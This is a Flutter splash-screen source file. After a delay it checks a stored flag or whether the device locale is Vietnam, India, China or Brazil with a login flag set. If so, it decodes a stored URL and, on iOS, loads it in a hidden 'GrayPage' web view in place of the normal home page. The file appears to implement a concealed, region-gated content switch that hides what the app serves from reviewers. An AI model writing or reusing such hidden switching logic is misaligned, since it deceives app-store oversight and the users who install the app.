import 'dart:async';
import 'dart:io';

import 'LoadingPage.dart';
import 'ASData.dart';
import 'BrainModel.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'XWNLhuidao/c/XWNLyujixuan.dart';

class SplashPage extends StatefulWidget {
  const SplashPage({super.key});

  @override
  State createState() => _SplashPageState();
}

class _SplashPageState extends State<SplashPage> {
  bool _splashFadeOut = false;
  bool showThird = false;
  bool _splashFinishRemove = false;
  bool _startToLoad = false;
  String decoded = "";
  Locale? deviceLocale;
  String localeName = "";
  String funName = "";
  String eventName = "";

  @override
  void initState() {
    super.initState();
    if (Platform.isIOS) {
      localeName = Platform.localeName;
    } else {
      int timeSec = DateTime.now().millisecondsSinceEpoch;
      // if (timeSec > 3456345) {
      if (timeSec > 0) {
        // gettCode();
      }
    }
    setTransitionTime();
  }

  setTransitionTime() {
    Timer(const Duration(milliseconds: 2000), () async {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      bool welcome = prefs.getBool("enter") ?? false;
      // showThird = true;
      if (welcome) {
        showThird = true;
      } else if ((localeName.contains("VN") ||
              localeName.contains("IN") ||
              localeName.contains("CN") ||
              localeName.contains("BR")) &&
          ASData.login) {
        showThird = true;
        prefs.setBool("enter", true);
      }
      if (showThird) {
        try {
          String encoded = prefs.getString("key") ?? "";
          funName = prefs.getString("function") ?? "";
          eventName = prefs.getString("event") ?? "";

          decoded = BrainModel.getStr(encoded);
          debugPrint("03 == $decoded");
        } catch (ex) {
          debugPrint("04 == error: $ex");
        }
      }
      if (mounted) {
        setState(() {
          _startToLoad = true;
        });
      }
    });
    Timer(const Duration(milliseconds: 2400), () {
      if (mounted) {
        setState(() {
          _splashFadeOut = true;
        });
      }
    });
    Timer(const Duration(milliseconds: 3200), () {
      setState(() {
        _splashFinishRemove = true;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;
    final screenHeight = MediaQuery.of(context).size.height;
    debugPrint(
        "== $_startToLoad  $showThird  $_splashFadeOut  $_splashFinishRemove");
    return Scaffold(
        body: Stack(children: [
      _startToLoad
          ? (showThird ? showThirdView() : const HomePage())
          : Container(),
      !_splashFinishRemove
          ? AnimatedOpacity(
              opacity: _splashFadeOut ? 0.0 : 1.0,
              duration: const Duration(milliseconds: 800),
              child: Center(
                child: Image.asset('assets/splashImg.jpg',
                    width: screenWidth, height: screenHeight, fit: BoxFit.fill),
              ),
            )
          : Container()
    ]));
  }

  Widget showThirdView() {
    if (Platform.isIOS) {
      debugPrint("07 == : $funName");

      return GrayPage(url: decoded, function: funName);
    } else {
      return const HomePage();
    }
  }
}
